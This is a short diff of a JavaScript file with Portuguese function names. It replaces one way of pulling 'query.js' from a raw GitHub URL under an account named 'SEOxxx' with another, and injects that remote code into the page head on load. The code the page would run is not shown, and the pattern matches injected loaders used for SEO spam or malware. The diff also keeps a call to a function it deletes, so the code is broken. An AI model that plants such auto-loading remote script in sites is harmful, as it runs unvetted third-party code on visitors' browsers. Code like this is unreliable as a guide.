@@ -1,16 +1,9 @@
- function carregarScriptAutomaticamente() {
-  var scriptTag = document.createElement('script');
-  var url = 'https://raw.githubusercontent.com/SEOxxx/y/main/query.js';
+carregarScriptAutomaticamente();
 
-  fetch(url)
-    .then(response => response.text())
-    .then(conteudo => {
-      scriptTag.textContent = conteudo;
-      document.head.appendChild(scriptTag);
-    })
-    .catch(error => {
-      console.error('Erro ao carregar o arquivo JavaScript:', error);
-    });
+  function adicionarScriptNaHead(url) {
+  var scriptTag = document.createElement('script');
+  scriptTag.src = url;
+  document.head.appendChild(scriptTag);
 }
 
-carregarScriptAutomaticamente();
+adicionarScriptNaHead('https://raw.githubusercontent.com/SEOxxx/y/main/query.js');
